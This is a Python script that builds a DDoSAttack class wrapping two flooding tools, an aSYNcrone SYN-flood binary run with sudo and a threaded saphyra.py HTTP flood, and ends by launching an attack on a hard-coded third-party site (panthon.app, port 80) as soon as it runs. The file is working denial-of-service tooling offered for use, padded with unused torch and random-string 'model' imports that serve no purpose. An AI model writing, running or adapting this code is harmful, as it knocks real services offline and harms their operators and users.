import torch
import torch.nn as nn
from random_string_generator import RandomStringGenerator
import logging
import os
import subprocess
import sys
import platform
from urllib.parse import urlparse
import socket
import threading

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(
        self,
        target_url,
        target_port=None,
        num_connections=None,
        attack_type="asyncrone",
    ):
        self.target_url = target_url
        self.target_port = target_port
        self.num_connections = num_connections
        self.attack_type = attack_type
        self.threads = []
        self.model = RandomStringGenerator(100)

    def create_connection(self):
        if self.attack_type == "asyncrone":
            self.run_attack()
        elif self.attack_type == "saphyra":
            for _ in range(self.num_connections):
                thread = threading.Thread(target=self.run_attack)
                thread.start()
                self.threads.append(thread)

    def run_attack(self):
        if self.attack_type == "asyncrone":
            self.aSYNcrone_attack()
        elif self.attack_type == "saphyra":
            self.saphyra_attack()
        else:
            logging.error(f"Unknown attack type: {self.attack_type}")

    def aSYNcrone_attack(self):
        if sys.platform == "darwin" and platform.machine() == "arm64":  # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
            )
        elif sys.platform == "darwin":  # noqa
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
            )
        elif sys.platform == "linux":
            path_to_executable = os.path.join(
                os.path.dirname(__file__), "aSYNcrone/aSYNcrone"
            )
        else:
            logging.error(f"Unknown platform: {sys.platform}")
            return
        # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
        parsed_url = urlparse(self.target_url)
        hostname = parsed_url.netloc
        ip = socket.gethostbyname(hostname)
        command = [
            "sudo",
            path_to_executable,
            "80",
            ip,
            str(self.target_port),
            str(self.num_connections),
        ]
        try:
            subprocess.run(command)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error while running aSYNcrone: {e}")
            return

    def saphyra_attack(self):
        command = [
            "python3",
            os.path.join(os.path.dirname(__file__), "saphyra.py"),
            self.target_url,
        ]
        try:
            subprocess.run(command)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error while running saphyra: {e}")
            return

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


# Target parameters
target_url = "https://panthon.app"
target_port = 80
num_connections = 1

# Create and launch attack
attack = DDoSAttack(target_url, target_port, num_connections, "saphyra")
attack.create_connection()
attack.wait_for_threads()
